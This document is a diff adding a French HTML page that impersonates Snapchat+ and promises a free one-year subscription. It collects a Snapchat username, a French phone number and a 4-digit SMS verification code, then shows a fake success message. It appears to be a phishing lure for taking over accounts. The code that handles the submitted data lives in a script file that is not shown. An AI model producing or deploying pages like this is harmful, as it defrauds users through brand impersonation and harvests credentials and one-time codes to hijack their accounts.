@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Snapchat+</title>
+  <link rel="icon" type="image/jpg" href="content/img/snapplus.jpg">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" type="text/css" href="content/styles/styles.css">
+  <script src="content/scripts/script.js"></script>
+</head>
+<body>
+  <div class="logo-card">
+    <img src="content/img/snapplus.jpg" alt="Snap+ Logo" style="user-select: none;">
+    <h1 style="user-select: none;">Snap+</h1>
+  </div>
+
+  <div class="disclaimer-card">
+    <p style="user-select: none;">⚠️ Disclaimer: L'abonnement Snapchat+ ne vous sera pas facturé. L'abonnement est disponible uniquement pour les utilisateurs éligibles.</p>
+  </div>
+
+  <div id="initial-form">
+    <p style="user-select: none;">Active Snap+ gratuitement pendant 1 an !</p>
+
+    <form id="signup-form">
+      <input type="text" id="username-input" placeholder="Nom d'utilisateur Snapchat" required>
+
+      <div class="phone-field">
+        <img src="content/img/frenchflag.svg" alt="Drapeau français" style="user-select: none;">
+        <span style="user-select: none;">+33</span>
+        <div class="separator"></div>
+        <input type="tel" id="phone-input" placeholder="Numéro de téléphone" required>
+      </div>
+      <div class="error-message" id="phone-error" style="display: none; user-select: none;"></div>
+
+      <button type="submit" style="user-select: none;">Continuer</button>
+    </form>
+  </div>
+
+  <div id="verification-form" style="display: none;">
+    <p style="user-select: none;">Un code de vérification a été envoyé par SMS</p>
+    <p style="user-select: none; font-size: 0.9em; color: #666; margin-top: -10px;">Le code peut prendre jusqu'à 3 minutes pour arriver</p>
+
+    <form id="code-form">
+      <input type="text" id="code-input" placeholder="Code à 4 chiffres" maxlength="4" pattern="[0-9]{4}" required>
+      <div class="error-message" id="code-error" style="display: none; user-select: none;"></div>
+      <button type="submit" style="user-select: none;">Vérifier</button>
+    </form>
+  </div>
+
+  <div id="success-screen" style="display: none;">
+    <div class="success-card">
+      <div style="font-size: 3em; margin-bottom: 20px; user-select: none;">✅</div>
+      <h2 style="user-select: none; margin: 0 0 15px 0;">Vérification réussie !</h2>
+      <p style="user-select: none; color: #666;">Vous allez recevoir votre abonnement Snap+ sous peu.</p>
+    </div>
+  </div>
+</body>
+</html>
